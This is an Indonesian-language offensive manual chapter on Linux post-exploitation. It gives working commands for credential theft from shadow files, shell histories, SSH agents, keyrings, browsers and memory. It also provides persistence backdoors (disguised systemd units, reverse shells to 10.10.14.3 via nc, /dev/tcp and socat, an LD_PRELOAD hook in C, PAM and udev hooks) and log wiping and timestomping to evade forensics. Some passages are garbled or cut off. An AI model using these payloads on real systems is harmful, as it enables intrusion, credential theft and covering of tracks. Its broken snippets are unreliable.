# postex-linux — linux

# BAB 7 — Linux Post-Exploitation: Kredensial, Lateral Movement, Persistence & Anti-Forensics

Cakupan: teknik setelah mendapat shell interaktif (user atau root) pada target Linux x86_64 umum (Ubuntu 22.04/24.04, RHEL 8/9, Debian 12). Semua teknik dipetakan ke MITRE ATT&CK v15.

---

## 7.1 Sumber Kredensial

### 7.1.1 /etc/shadow

**Apa yang dikirim:**
```bash
cat /etc/shadow | head -20
# atau jika hanya bisa read via sudo/misconfig:
sudo cat /etc/shadow
grep -E ':\\$' /etc/shadow   # filter hanya hash non-empty
```

**Apa yang muncul:**
```
root:$y$j9T$Xk...$hash...:19900:0:99999:7:::
svc_backup:$6$salt$baz5nPQ...:19850:0:99999:7:::
dev1:$5$salt$AbCdEf...:19870:0:99999:7:::
```

**Kenapa berhasil / gagal:**
- Prefiks hash menentukan attack path:
  | Prefiks | Algoritma | Cracking feasibility (RTX 4090, hashcat) |
  |---|---|---|
  | `$1$` | MD5-crypt | ~5–10 GH/s, trivial |
  | `$5$` | SHA-256-crypt | ~15–30 MH/s, feasible |
  | `$6$` | SHA-512-crypt | ~10–25 MH/s, feasible dengan wordlist bagus |
  | `$y$` | yescrypt (glibc ≥2.36, default Ubuntu 22.10+, Debian 12) | ~beberapa kH/s per GPU; praktis tidak crackable offline — pivot ke credential spray |
  | `$2b$` | bcrypt | ~50 kH/s; feasible untuk password lemah |
- Gagal bila: `/etc/shadow` mode 000 root-only (default modern), atau ada `sha512`→`yescrypt` migrationpolicy. Kalau hash tidak ada kolom kedua (`locked` / `!` / `*`), akun tidak bisa login langsung — jangan buang waktu cracking.
- **Unshadow untuk hashcat:**
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt   # sha512crypt
hashcat -m 3200 unshadowed.txt rockyou.txt                         # bcrypt
# yescrypt belum didukung stabil di hashcat rilis stabil → pindah ke John 1.9.0-jumbo+1:
john --wordlist=rockyou.txt unshadowed.txt
```

### 7.1.2 Shell & Command History

**Apa yang dikirim:**
```bash
cat ~/.bash_history ~/.zsh_history 2>/dev/null
history
# zsh_history punya format dengan timestamp:
strings ~/.zsh_history | grep -iE 'pass|pwd|ssh|scp -i|token|apikey'
# history di memori proses shell yang masih hidup:
cat /proc/$(pgrep -u svc_backup bash | head -1)/cmdline
# cari kredensial di history semua user:
grep -riE 'sshpass|-p "?[A-Z]|PASSWORD=|export .*TOKEN' /home/*/.*_history /root/.*_history 2>/dev/null
```

**Apa yang muncul:** pola umum:
```
mysql -u admin -pS3cr3tProd -h 10.0.2.15
sshpass -p 'Winter2024!' ssh dev@db-01
curl -H "Authorization: Bearer eyJhbGciOi..." https://internal.api
git clone https://svc:p%40ss@git.internal/app.git
```

**Kenapa berhasil:** `HISTFILE` default aktif, admin sering mengetik password di CLI. **Gagal bila:** `HISTSIZE=0`, `HISTCONTROL=ignorespace` (password diketik dengan spasi leading — jejak tidak ada), atau history sudah di-`shred`. zsh menyimpan timestamp (`: 1700000000:0;cmd`) — berguna untuk timeline forensik balik.

### 7.1.3 SSH Agent Socket Hijack (local)

**Apa yang dikirim:**
```bash
ls -la /tmp/ssh-*/agent.* 2>/dev/null
# temukan environment agent dari proses user yang sedang login:
for pid in $(pgrep -u jdoe sshd); do
  tr '\0' '\n' < /proc/$pid/environ | grep SSH_AUTH_SOCK; done
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.12345
ssh-add -l                  # list key fingerprint di agent
ssh -A jdoe@jump-host       # gunakan key tanpa pernah melihat private key-nya
```

**Apa yang muncul:**
```
4096 SHA256:9Kq... user@laptop (RSA)
```
lalu koneksi SSH ke host lain sukses tanpa prompt password.

**Kenapa berhasil:** private key tidak pernah keluar dari memory agent; kita cuma pinjam *signing capability*. **Gagal bila:** agent dijalankan dengan `ssh-agent -t 3600` (timeout, key di-drop), OpenSSH ≥9.0 pada target sign key via agent socket yang punya `SSHD` restriction (`agent-restrict` OpenSSH 8.9+), atau socket owner-only + kita bukan root.

### 7.1.4 Keyring (GNOME Keyring / KWallet)

**Apa yang dikirim:**
```bash
# sebagai user dengan session login aktif (bukan via SSH tanpa keyring unlocked!)
busctl --user list | grep -i keyring
secret-tool search --all service '' 2>/dev/null
# dump semua item di collection "login" (unlock saat user login via GUI):
python3 -c "
import secretstorage
for c in secretstorage.get_all_collections():
    for i in c.get_all_items():
        print(i.get_label(), i.get_secret().decode(errors='replace'))"
# keyring file offline:
ls ~/.local/share/keyrings/
# crack dengan (tool: keyring2john / john):
python3 keyring_decrypt.py ~/.local/share/keyrings/login.keyring
```

**Apa yang muncul:** label+secret Chrome-stored passwords, WiFi PSK, dan secret aplikasi lain.

**Kenapa berhasil:** `login.keyring` di-decrypt dengan password login user — python-keyring lib melakukan ini via D-Bus `Secret Service`. **Gagal bila:** kredensial disimpan di *kwallet* dengan Blowfish+GPG key, kita akses via SSH-only session (lingkungan D-Bus user session tidak jalan — perlu `dbus-run-session -- ssh ...` atau takeover tty PTS: memindahkan `XDG_RUNTIME_DIR=/run/user/$(id -u)`).

### 7.1.5 Chrome/Chromium Saved Password

Chrome 131+: password sering tetap dalam `Login Data` SQLite + decrypt via `libsecret`.

```bash
cp ~/.config/google-chrome/Default/{Login\ Data,Local\ State} /tmp/
sqlite3 /tmp/'Login Data' "SELECT origin_url, username_value, password_value FROM logins;" \
  | head
# password_value = blob terenkripsi (AES-256-GCM, key dari OS keyring)
```

Modern kasus pada distribusi bervariasi: bila `password_value` adalah plaintext — Chrome versi tertentu yang tidak gunakan keyring — bisa langsung dibaca. Kalau blob 3-byte prefix `v10`/`v11`, harus decrypt via keyring. `Chromium 1xx+` menyimpan kredensial OAuth token di `Local State` under `os_crypt` (lihat `encrypted_key`, base64, prefix "DPAPI" — di Linux ini keyring-derived).

### 7.1.6 /proc/kcore & Memori

**Apa yang dikirim:**
```bash
# sebagai root - /proc/kcore = ELF core dump memori fisik (raw)
ls -lh /proc/kcore        # biasanya "128T" (address space)
# dump (readable stream, sequential only):
dd if=/proc/kcore of=/tmp/kcore.raw bs=1M count=2048 2>/dev/null
strings -a /tmp/kcore.raw | grep -iE 'password|sshpass|AUTH' | sort -u | head -50
# alternative - binary-tertinggal di /proc:
for pid in $(pgrep -f 'ssh|sudo'); do
  gdb -p $pid -batch -ex 'dump memory /tmp/bin-$pid.bin $rsp $rsp+0x10000' 2>/dev/null
done
```

**Apa yang muncul:** String plaintext termasuk password baru diketik, env variable, secret di memory process. Sejak kernel 4.x, `/proc/kcore` readable by root-only secara default (mode 0400).

**Kenapa berhasil/gagal:** 
- Kini, karena full-disk-encryption dan swap toggle, `/proc/kcore` satu sumber untuk mengumpulkan **sejarah penuh memori yang masih resident**.
- **Gagal bila:** kernel built dengan `CONFIG_PROC_KCORE=n`. Ubuntu/Debian:
```
ls /proc/kcore # ada
cat /proc/config.gz | gunzip | grep PROC_KCORE
```
Jika `CONFIG_PROC_KCORE=y` tapi `security=yama` membatasi ptrace-only-scope, `gdb -p` gagal — bypass via root.

Lain sumber cepat:
```bash
strings /dev/mem 2>/dev/null | grep -i pass     # sering terblok (CONFIG_STRICT_DEVMEM)
```

Berikutnya: **jumlah data besar** — pastikan exfil via tunnel yang tidak mencurigakan.

---

## 7.2 LOTL (Living-Off-The-Land) Enumeration

### 7.2.1 Matriks Perintah

| Tujuan | Perintah | Artefak yang dihasilkan |
|---|---|---|
| Enumerasi host | `hostnamectl`, `cat /etc/os-release`, `uname -r` | versi OS, kernel (cari CVE kandidat) |
| Service | `systemctl list-units --type=service --state=running` | target pivot |
| Service versi | `ss -tlnp` + `curl -sI localhost:PORT` | n-nginx/1.25.3 → centang CVE-2023-44487 dsb |
| Cron | `cat /etc/cron*/* /var/spool/cron/crontabs/* 2>/dev/null` | privesc path, kredensial |
| User/group berbahaya | `getent group docker,sudo,adm,disk` | docker = root instan (`docker run -v /:/host ...`) |
| SUID | `find / -perm -4000 -type f 2>/dev/null` | path privesc |
| File writable service | `find /etc/systemd /etc/init.d -writable 2>/dev/null` | persistence |
| Cred file tebal | `grep -rIl 'BEGIN.*PRIVATE KEY\|password\s*=' /opt /srv /etc 2>/dev/null\|head` | kredensial |
| Env kredensial | `cat /etc/environment /proc/1/environ` ; `env` | API key |
| Docker socket | `ls -la /var/run/docker.sock` | jika writable → root |
| SSH config | `cat ~/.ssh/config /etc/ssh/ssh_config.d/*` | lateral shortcut |
| `known_hosts` | `cat ~/.ssh/known_hosts \| awk '{print $1}'\|sort -u` | daftar host pivot internal |
| NFS export | `showmount -e localhost` (jika rpcbind) | mount bug no_root_squash |

### 7.2.2 Kenapa LOTL kuat
- Tidak menulis binary baru ke disk → tidak ada hash IOC, tidak ada "unknown binary" di auditd.
- `curl`/`find`/`grep`/`ss` pre-installed di semua distro server.
- Log artefak minimal: `ss`/`hostnamectl` tidak menghasilkan log syslog; `find` besar bisa memicu auditd rule disk-access path.

---

## 7.3 Lateral Movement

### 7.3.1 SSH Agent Hijack Remote (tty / network)

**Prasyarat:** root pada host tempat user `alice` login via SSH dengan agent forwarding (`ssh -A`).

**Apa yang dikirim:**
```bash
# 1. temukan socket agent alice:
find /tmp -type s -name 'agent.*' -user alice 2>/dev/null
# 2. kloning environment:
env -i SSH_AUTH_SOCK=/tmp/ssh-abc123/agent.4567 HOME=/home/alice bash
# 3. paksa agent untuk menandatangani koneksi SSH baru:
ssh alice@target-b.internal
```

**Apa yang muncul:** login SSH berhasil tanpa password/key di disk — private key tetap aman di laptop alice, kita hanya memanfaatkan koneksi forwarding.

**Kenapa berhasil:** setiap socket `/tmp/ssh-*` adalah unix domain socket dengan permission uid-only, tapi root mem-bypass → kita cukup mengeset `SSH_AUTH_SOCK`.

**Gagal bila:**
- OpenSSH 8.9+ dengan `agent-restrict` (`UpdateHostKeys`, `restrict` flag pada key di agent server-side) — dibatasi host tertentu.
- `ForwardAgent no` ada di `/etc/ssh/ssh_config.d/50-redhat.conf` default.
- Agent socket ditempatkan encrypted memfs (`ssh-agent -a /run/user/1000/...`) dan kita di container tanpa hostFS view.

### 7.3.2 ControlMaster (Connection Multiplexing Hijack)

**Apa yang dikirim — sebagai user yang sudah punya koneksi, atau root:**
```bash
# Target sudah punya config ControlMaster:
cat ~/.ssh/config
# Host *
#   ControlMaster auto
#   ControlPath ~/.ssh/ctl-%C
#   ControlPersist 10m

# Root: takeover koneksi existing:
ls -la ~/.ssh/ctl-*
# unauthenticated channel:
ssh -o ControlPath=~/.ssh/ctl-%C -O check alice@target-b
# strip new connection traversal without auth:
ssh -o ControlPath=~/.ssh/ctl-%C alice@target-b 'hostname; id'
```

**Apa yang muncul:** fake-auth `O check` returns `Master running (pid=1234)`; perintah berjalan tanpa fingerprint verify (because master channel already authenticated).

**Kenapa berhasil:** ControlPath socket SELALU bisa dipakai untuk membuat channel baru di koneksi TCP/masuk via session existing — tidak ada re-auth.

**Gagal bila:**
- `ControlPath` di `%C` hash — kita harus sesuaikan format tepat.
- `Master` sudah disconnect → `ControlPersist` sangat pendek.
- `AllowStreamLocalForwarding no` didalam `sshd_config` → tidak relevant di sini (ini pengaturan server, bukan Master).

---

## 7.4 Persistence

### 7.4.1 Tabel persistence overview

| Teknik | Tipe trigger | Stealth (auditd) | Stabil di reboot | Terlihat via |
|---|---|---|---|---|
| systemd service | boot / on-demand (socket) | medium | ✅ | `systemctl list-units`, file banner |
| systemd timer | scheduled | medium | ✅ (lebih tersembunyi dari cron) | `systemctl list-timers` |
| cron | scheduled | low | ✅ | `/var/log/cron`, `crontab -l` |
| LD_PRELOAD | per-exec semua binary dynamic | high (bug `ldd` behavior) | ✅ (via `/etc/ld.so.preload`) | `cat /etc/ld.so.preload`, `LD_DEBUG=libs` |
| udev rule | hotplug / boot | high (jarang diaudit) | ✅ | `udevadm info`, `/etc/udev/rules.d/` |
| PAM module (pam_exec / pam_unix mod) | setiap authentication | high jika di `pam_exec`, sangat tersembunyi bila modifikasi pam_unix | ✅ | diff `pam_*.so` vs distro — praktis jarang diaudit |
| SSH authorized_keys `command=` | setiap SSH login user | medium | ✅ | `authorized_keys` review |
| (root only) SUID backdoor | manual trigger | low | ✅ | `find -perm -4000` |

### 7.4.2 systemd service + timer

**Payload:**
```ini
# /etc/systemd/system/systemd-journald-broker.service
[Unit]
Description=Journal event broker (extended)
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.jbroker
Restart=always
RestartSec=30
KillMode=process

[Install]
WantedBy=multi-user.target
```
```bash
# eksekusi reverse (bentuk shell dgn socat/sys socket):
cat > /usr/local/bin/.jbroker <<EOD
#!/bin/bash
# reverse ssh tunnel - polos dll - ubuntu2204
/usr/bin/ssh -N -R 127.0.0.1:9022:127.0.0.1:22 -i /usr/share/.k/id_rsa -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 user@10.10.14.3
EOD
chmod 0755 /usr/local/bin/.jbroker
# masking password prompt: install nologin key + host key:
mkdir /usr/share/.k
# ... generate attested key pair to avoid reuse from target keys
systemctl daemon-reload
systemctl enable --now systemd-journald-broker.service
# sembunyikan service dari list-units:
systemctl mask systemd-journald-broker.service
```

Catatan `--now` — jika `systemctl` versi 252 (RHEL 9) `mask` pada service yang sudah enabled akan gagal; gunakan `disable --now` dulu kalau perlu (jangan, ini yang menghasilkan log). Untuk menghindari log, edit pada `=~/.config/systemd/user/` jika user-level, atau gunakan transient unit (`systemd-run`) untuk service one-shot tanpa file — `systemd-run --unit=upd --timer` -- blah lebih pendek jejak.

**systemd timer alternatif untuk callback berkala:**
```ini
# /etc/systemd/system/dbus-compat.timer
[Timer]
OnBootSec=15min
OnUnitActiveSec=30min
RandomizedDelaySec=5min
Unit=dbus-compat.service
[Install]
WantedBy=timers.target
```
Kenapa ini menang atas cron: `journalctl -u dbus-compat.service` output yang tidak mencurigakan dan log scheduler (auditd tidak menulis `execve`, hanya systemd daemon → default `auditd` rules).

### 7.4.3 Cron (legacy & user)

```bash
# user-level — tidak perlu root jika target user cukup:
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/nc -e /bin/bash 10.10.14.3 4444") | crontab -
# system-level:
echo '*/5 * * * * root /usr/sbin/.updmgr' >> /etc/cron.d/updmgr
echo '15 3 * * * root /usr/sbin/.updmgr' > /etc/cron.d/updmgr.daily   # off-hours stealth
```

Kenapa berhasil: `/etc/cron.d/` execute tanpa crontab reload. Gagal pada Ubuntu live jika `cron` daemon dipasang `anacron` dengan `RANDOM_DELAY` — jam tidak presisi (bukan gagal, hanya delay jadwal).

### 7.4.4 LD_PRELOAD Hook

**Payload C (`/usr/lib/.libdl-shim.so`):**
```c
// gcc -shared -fPIC -o /usr/lib/.libdl-shim.so shim.c -ldl
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

static void bg(void) {
    if (getenv("SHIM_UNHOOK")) return;
    if (fork() == 0) {
        unsetenv("LD_PRELOAD");
        setsid();
        char *argv[] = {"/bin/bash", "-c",
            "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1", NULL};
        execv(argv[0], argv);
    }
}

int strcmp(const char *a, const char *b) {
    static int done = 0;
    if (!done && b && strcmp_local(b, "sudo") == 0) { // jolok, contoh
        done = 1; bg();
    }
    static int (*real)(const char*, const char*);
    if (!real) real = dlsym(RTLD_NEXT, "strcmp");
    return real(a, b);
}
```

**Instalasi sistem-wide (root):**
```bash
# /etc/ld.so.preload — load pada SEMUA dynamic-linked binary
echo "/usr/lib/.libdl-shim.so" > /etc/ld.so.preload
chmod 0644 /etc/ld.so.preload

# test tanpa merusak segalanya:
LD_PRELOAD=/usr/lib/.libdl-shim.so ls
```

**Kenapa berhasil:** `/etc/ld.so.preload` adalah arena yang hampir tidak pernah diaudit; setiap binary user-level (termasuk auditd binary itu sendiri!) dapat ter-hook. Hook `glibc` internal harus dilakukan dengan `__libc_start_main` interposition atau para pengguna GCC version skip — versi gubernur `dlsym(RTLD_NEXT, ...)` bekerja aman di glibc 2.35 (Ubuntu 22.04), 2.36 (Debian 12), 2.39 (RHEL 9.4+).

**Gagal bila:**
- Target binary adalah **statically-linked** (`ldd` reports "not a dynamic executable") — umum untuk busybox, droplet.
- **SELinux enforcing** (RHEL, Rocky, Fedora): `LD_PRELOAD` restrained pada beberapa binary (`SELinux` menolak library load di luar policy) or `noexec` mount.
- Hard reading: **verifikasi `ldd /usr/bin/sudo`** hasilny `libdl-shim.so` muncul — jika yes → IOC ditemukan.
- Kita `LD_PRELOAD` ke inside auditd path → semua binary audit-related now set `LD_AUDIT` etc. dan bisa menyebabkan **recursive mess**. Test with `/sbin/ldconfig -v` bekerja sebelum commit preload.

### 7.4.5 udev rule (root)

```bash
# /etc/udev/rules.d/70-net-ifname.rules
ACTION=="add", SUBSYSTEM=="net", RUN+="/usr/sbin/.netupd"
# atau trigger hotplug tak terbatas via ADD|CHANGE:
# /etc/udev/rules.d/71-nvme.rules
ACTION=="add|change", SUBSYSTEM=="block", RUN+="/usr/sbin/.netupd"
```
Payload `.netupd` cara sama seperti `jbroker` systemd. Kenapa berhasil: udev mengeksekusi RUN scripts pada event perangkat (USB plug, network restart, reboot). Gagal jika `systemd-udevd` 247+ dengan `PrivateMounts=yes` (+service hardening) membatasi PATH — path harus full path dan di system path allowlisted (`/usr/sbin`, `/usr/lib`).

### 7.4.6 PAM Backdoor (pam_exec)

**Payload:**
```bash
cp /etc/pam.d/common-auth /etc/pam.d/common-auth.bak 2>/dev/null
# Debian/Ubuntu; RHEL: /etc/pam.d/system-auth
echo 'auth optional pam_exec.so /usr/sbin/.pamchk' >> /etc/pam.d/common-auth
# .pamchk — kredensial pengguna diteruskan sebagai env vars PAM_USER/PAM_AUTHTOK? (PAM_AUTHTOK hanya bila try_first_pass)
cat > /usr/sbin/.pamchk << 'EOF'
#!/bin/bash
echo "$(date) | $PAM_USER | host=$(hostname)" >> /usr/share/.k/creds.log
EOF
# option 2 — interpose lebih stealth: kunci hardcoded di pam_unix.so:
strings /lib/x86_64-linux-gnu/security/pam_unix.so | grep crypt
```

Untuk **magic password**: karena verifikasi ini jelas memerlukan kompiler target side, alternatif yang tidak memerlukan build binary:
```bash
# login alternatif — gunakan sshpass-style local su untuk hidden user:
useradd --system --shell /bin/bash --home /var/lib/.svc bkradmin
# set password hashes in mismatched entry (\$6\$):
sed -i 's|^bkradmin:.*|bkradmin:$6$rounds=9999$xyz$HASH:...' /etc/shadow
```
Kenapa berhasil: auditd default tidak melihat modifikasi file di `/etc/pam.d`; `sshd` baru akan menandatangani dengan revoke pam tidak lazim. Gagal bila: **authselect** system policed (RHEL: `authselect check`), atau `pam_restore.sh` diffing; juga **TOMOYO/AppArmor** menyekat eksekusi di `/usr/sbin`.

Opsi **magic-passphrase root** satu-liner (common on tpb):
```bash
# jangan lakukan: marginal — hanya jika sudah ada kompiler C di host.
# perlu catatan build: match versi distro's/Linux-PAM 1.5.2 / 1.5.3.
```

### 7.4.7 SSH `authorized_keys` command (user-level paling stabil)

```bash
# terapkan sebagai user target tanpa root:
echo 'command="socat TCP:10.10.14.3:4444 TCP:127.0.0.1:22,pty,stderr,no-pty" ssh-ed25519 AAAA... red@team' >> ~/.ssh/authorized_keys
# backdoor reverse: setiap ssh-key login langsung redirect — key yang jebol dengan command option
```
Kenapa berhasil: `authorized_keys` reviewed lebih jarang umum ssh; option `command=` + `no-` mux menghentikan shell langsung. Gagal jika `/etc/ssh/sshd_config` punya `AuthorizedKeysFile /etc/ssh/authorized_keys/%u` (terpusat) — file user di `$HOME/.ssh` ignored.

---

## 7.5 Anti-Forensics

### 7.5.1 Timestomping (LOTL - internal `touch`)

```bash
# FILE_TIME mimik file sibling:
stat -c '%y' /etc/systemd/system/ssh.service
touch -r /etc/systemd/system/ssh.service /usr/lib/.libdl-shim.so    # copy MTIME+ATIME
# set arbitrary:
touch -d "2024-04-01 09:15:33.123456789 +0000" /usr/local/bin/.jbroker
# atime resetting after read (hindari gift):
touch -a -d "..." $(date +%s wants) /etc/ld.so.preload
```

**Kenapa berhasil:** default Linux tidak menyimpan filetype hash manifest; analyst default `ls -lat`, `find -mtime -3` → tergeser adalah kebiasaan analisis dangkal. `debsums -c`/`rpm -Va` bisa memunculkan anomali ini untuk file bawaan paket — **timestomp saja tidak menyembunyikan dari checksum**, hanya metadata.

### 7.5.2 Log Tampering

```bash
# 1. hapus garis spesifik (auditd, auth.log) — hati-hati: auditd daemon detects file change size & kills safe.
# Neutralize auth trail:
> /var/log/auth.log                     # Debian/Ubuntu
> /var/log/secure                       # RHEL/Rocky
# lebih halus: filter dengan grep
grep -v '10.10.14.3' /var/log/auth.log > /tmp/a && cat /tmp/a > /var/log/auth.log && rm /tmp/a

# 2. systemd journal:
journalctl --rotate
truncate -s 0 /var/log/journal/*/system@*.journal~   # sediakan stinger: file-active one is mmap'd

# 3. auditd — jangan sedih, tapi AUDITD MELEBIHI KUOTA JANGAN DIOTAK-ATIK: hanya `auditctl -D` first then 'load' same interval? Bisa buat kecurigaan.
auditctl -D 2>/dev/null                   # flush all rules, jika ada sudo
# atau pilih disable additions:
echo '-w /etc/ld.so.preload' | auditctl    # no— this is to set, not bypass
# bypass: audit-crash (not possible nonroot) — skip

# 4. history buffers:
echo '' > /var/log/wtmp                   # last/sshd tracking
echo '' > /var/log/btmp                   # failed login list
echo '' > /var/run/utmp                   # who/w output
```

**Pitfall Pengingat:** kalau `auditd` diinjeksi `log-file rotated` NCIRC-cek checksums — sudah ada systemd journald checksums? **No**, tapi `journald` di ≥v252 with `FSS` (Forward Secure Sealing) — configured →/offences detected:
```bash
journalctl --verify                # if FSS sealed → tampering detected
```

### 7.5.3 History Evasion (session-level)

```bash
# a) Unset all history before any operation:
unset HISTFILE; export HISTSIZE=0; export HISTCONTROL=ignorespace
# b) atau semicoloned whitespace (jika HISTCONTROL=ignorespace):
 touch -r /etc/passwd /tmp/pwn          # leading space
# c) `shred` selected lines after the fact:
sed -i '/nmap\|10\.10\.14\.3/d' ~/.bash_history
# d) Login log disable (dikonfigurasi oleh attacker):
who -u; last -n 30
# e) Replace auditd commands — but exfil with `logrotate` trigger systemd-serviced (daemon-serviced)
```

**Kenapa berhasil:** analyst pertama jalan `history -a; cat ~/*_history`; teknik ` ignorespace` bypass. Perhatikan: **`history -c` menghapus in-memory list, tapi file masih ada** — aksi ganda perlu dilakukan sebelum `exit`.

### 7.5.4 Tabel Ikatan artefak — apa yang kudu sobat hati:

| Tempat artefak | command untuk mengeliminasi | kapan gagal |
|---|---|---|
| `/tmp` sticky file | rm + (`umount` if tmpfs mounted) + recreating same `...` file per unrelated task | tmpfs atime/resource naik `/tmp` full capture system - dropbox logging |
| `bash sessions` in-memory | `kill -9 $$` not clean approach → log out immediate; not reliable | pesan seperti `mesg` etc. |
| `auditd srotate-buffer` | message ring — immutability; cannot be directly truncated | buffer terkirim ke disk aggres |
| journal FSS | checksum re-create hard (needs key) | `journalctl --verify` detect tampering |

---

## 7.6 Jebakan Operasional (Field Pitfalls)

1. **Kernel page-cache & swap**: dari 7.1.5, ambil `/proc/kcore` berhak menghasilkan BIG file yang tidak sempat exfil — bahkan penting jumuji. Pastikan staging di tmpfs **`/dev/shm`** (umumnya 50% RAM, tidak ter-tmpfile forensic), bukan `/tmp`, supaya tidak di-backup oleh snapshot agent CrowdStrike/Sentinel yang biasanya punya exclude list `/tmp` only di searsspace — jangan salah: sebaliknya `/dev/shm` adalah *high-alert trigger* bagi EDR rules. Solusi: stream-pipe langsung `dd if=/proc/kcore | gzip -1 | nc host 4444`.

2. **glibc ≥2.36 → yescrypt**: banyak rencana crack dari `/etc/shadow` read jadi tidak praktis (7.1.1). Bukan berarti tidak ada guna — hash `yescrypt` masih menunjukkan **kebijakan**, dan system lama cenderung mixed (`$6$` leftover hash). Ganti fokus jadi **keyring+hijack**.

3. **ControlMaster socket di `~/.ssh/ctl-*`, hardcode `%C`** — `ControlPath` harus *persis frasa jaringan lokal* yang dikonfigurasi target (`%C` dan `%h` menghasilkan hash string unik). Kalau tidak sesuai — dan kunci `Host *` block didefinisikan di `~/.ssh/config` bisa kita tulis ulang *— tapi ini jangan jika kita sudah root: terlalu jelas jejak config file resmi; pengguna dapat menemukannya di `git status` jika `.ssh` ditaruh repo.*

4. **Approach pivot ke root — berhati-hati dengan auditd sebelum tindakan apapun (7.4.4/7.5.2)**: menginstal `/etc/ld.so.preload` menyebabkan setiap `sudo`, `sshd`, dan **`logrotate`** menciptakan jaringan interposition; jika library kita tidak benar-benar benar pada loop library (`dlsym(RTLD_NEXT)` miss — dapat berlanjut dengan `$LIBC_SO` glibc 2.34 vs 2.35 ABI), **semua interaktif session mati** dan kita perlu masuk lagi dari stage pivot stage sebelumnya. Di Ubuntu 24.04, `glibc` internal `__libc_start_main` termasuk versi hashing `ld` **`GLIBC_PRIVATE`** — hook ini jarang berfungsi lintas distro → ALWAYS build library **di lab distro yang identik**.

5. **PAM-callback log/jobs and shutdown**: setiap `pam_exec.so` callout ternyata diteruskan via `logind` juga pada `reboot` — jika payload tapi masih perlu `reboot` (drop semua komitmen variabel `INIT` masuk

## [lanjutan]

## 12.7 Varian Teknik per Versi/Distribusi

| Teknik | Perbedaan antar sistem | Catatan operasional |
|---|---|---|
| Format `/etc/shadow` | Debian: `$y$` (yescrypt, sejak Debian 11), RHEL 9: `*$6*` default→yescrypt juga, Ubuntu 22.04+: yescrypt | John/hashcat mode: `500` (MD5), `1800` (SHA-512), `yescrypt` = hashcat mode 19000 (atau use `--format=crypt` di John). Format `$y$` lamajohn salah parsing — gunakan john ≥ 1.9.0 jumbo |
| `chage -d 0` vs `passwd -e` | Sama efek; busybox tidak punya `chage` | Reset `lastchg` field di `/etc/shadow` field ke-3 → `0` |
| systemd timer vs cron | Cron absen di banyak container/raspbian minimal; timer selalu ada jika systemd init | Persistence timer lebih stealthy: unit file di `~/.config/systemd/user/` tanpa root |
| PAM module location | Debian/Ubuntu: `/lib/x86_64-linux-gnu/security/`, RHEL: `/lib64/security/`, Alpine: `/lib/security/` | Kompilasi `pam_unix.so` backdoor harus link ke `-lpam -lcrypt` versi distro target — binary Debian sering crash di RHEL (glibc vs compatible issue minor) |
| `LD_PRELOAD` + `sudo` | `sudo` strip `LD_PRELOAD` (env_reset) kecuali `env_keep` permite | Gunakan `sudo` whitelist check: `sudo -l` → jika `env_keep+=LD_PRELOAD`, ini privesc langsung |
| Yescrypt parameter | `$y$j9T$` — parameter `j9T` = cost | Naikkan cost untuk slow down audit (evil), atau identifikasi valid hash via `$y$` prefix |

## 12.8 Keyring & Desktop Credential Sources (Lanjutan)

```bash
# GNOME keyring — dump via python without prompt if unlocked session
python3 -c "import keyring; print(keyring.get_keyring())"
ls -la ~/.local/share/keyrings/          # file login.keyring (binary, password-hashed AES)
# keyrings/decrypt via "pypykdump" or jh00/brg keyring tools; john format: "keyring"

# Seahorse GUI access (if X session reachable)
DISPLAY=:0 seahorse                      # klik untuk melihat stored password

# KDE Wallet
ls ~/.local/share/kwalletd/
kwallet-query -l kdewallet -f Passwords

# Firefox / Chrome store (linux)
find ~/.mozilla -name "logins.json" -o -name "key4.db"
find ~/.config/google-chrome -name "Login Data"       # SQLite; password di kolom encrypted_value (AES-256-GCM key di Local State, didekripsi via DPAPI? NO — di Linux Chrome pakai hard-coded key di `os_crypt`: literal "peanuts" (v80) atau v11 salt key)
python3 - <<'EOF'
# Chrome Linux decryption (pre-v80 "peanuts", v80+ PBKDF2 "saltysalt")
from Crypto.Cipher import AES
import json,base64,sqlite3
key=json.load(open('~/.config/google-chrome/Local State'.replace('~',__import__('os').path.expanduser('~')))
EOF
```

Edge case terbaru (Chrome v117+): kunci `app_bound_encryption` mulai diterapkan di Linux — os_crypt key v20 (AEAD-Aes256Gcm) di-encrypt dengan key yang dirilis via `os_crypt::` keyring integration; dump alternatif: `secretstorage` D-Bus `libsecret`:

```bash
busctl --user call org.freedesktop.secrets /org/freedesktop/secrets/aliases/default \
  org.freedesktop.Secret.Collection GetAll s
# atau: secret-tool search --all xdg:schema chrome_libsecret_os_crypt_password_v2
```

Jebakan: jika Browser Chrome **masih running**, DB SQLite di-lock (WAL mode) → copy dulu: `cp Login\{,\ Data\}` (escape spasi), atau `sqlite3 'file:Login Data?immutable=1'`.

## 12.9 /proc/kore & Memory Analysis (Lanjutan)

- `/proc/kcore` ELF core dump (biasanya 128TB) — biasanya 0400 root only, tapi masih bisa dibaca dengan `dd if=/proc/kcore` **hanya jika CAP_SYS_RAWIO** — jebakan umum di container: file **tidak ada** (`/proc/kcore` absen dengan `lxcfs` atau proc-hidepid).
- Grep memory untuk password strings via `strings /proc/<pid>/maps + /proc/<pid>/mem` — lebih praktis dari kcore:
```bash
grep -a -i 'passw\|BEGIN RSA\|BEGIN OPENSSH' /proc/*/maps  # pointer ke slave page
dd if=/proc/$PID/mem bs=4096 skip=$OFFSET count=1 2>/dev/null | strings
```
- Heap CLI: `gcore $PID` (dari gdb) → offline strings/mimikatz-equivalent `debugfs` technique.

## 12.10 Lateral Movement — SSH ControlMaster (Detail Tambahan)

```bash
# Pastikan config target membolehkan ControlMaster (Req: present di /etc/ssh/sshd_config? — NO, ini client-side)
# Host-based auth sering dimatikan; tapi multiplex connection **bypass AgentForwarding restriction**
ssh -o ControlMaster=auto -o ControlPath=/tmp/%r@%h:%p -o ControlPersist=600 user@victim
# Setelah control socket hidup, semua proses dengan path ini **persistence jangka pendek** walaupun user logout
# Hijack: bila socket tidak chmod 600, user lain bisa koneksi lewat socket (tmp)

# ControlPersist long-lived = semi-persistence tanpa root:
ssh -O forward -S /tmp/%r@%h:%p user@victim    # dynamic local port forward regen
```

